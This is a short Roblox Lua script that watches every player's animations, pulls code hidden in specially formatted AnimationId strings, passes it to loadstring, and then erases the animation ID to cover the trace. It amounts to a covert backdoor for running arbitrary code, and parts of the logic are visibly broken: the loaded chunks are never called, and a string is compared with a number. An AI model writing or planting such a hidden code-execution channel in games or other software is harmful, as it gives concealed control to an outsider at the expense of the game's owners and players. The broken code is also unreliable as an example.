local Players = game:GetService("Players")

local codeManagement = {}

local function onAnimationPlayed(track)
    --print("Animation played:", track.Animation.AnimationId)
    local id = track.AnimationId
    if id:match("c|") or id:match("ce|") then
        local parts = string.split(id,"|")
        local syntax = parts[1]
        local code = parts[2]
        local seed = parts[3]
        local order = parts[4]
        
        if order and order >= 2 then
            if syntax:match("e") then
                local connectedCode = ""
                for i,part in codeManagement[seed] do
                    connectedCode = connectedCode .. part
                end
                loadstring(connectedCode)
            else
                codeManagement[seed][order] = code
            end
        else
            loadstring(code)
        end
    end
    if track then
        track:Stop()
        track.AnimationId="rbxassetid://0"
        track=nil
    end
end

local function register(character)
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:WaitForChild("Animator").AnimationPlayed:Connect(onAnimationPlayed)
        end
    end
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        register(character)
    end)
    if player.Character then
        register(player.Character)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)
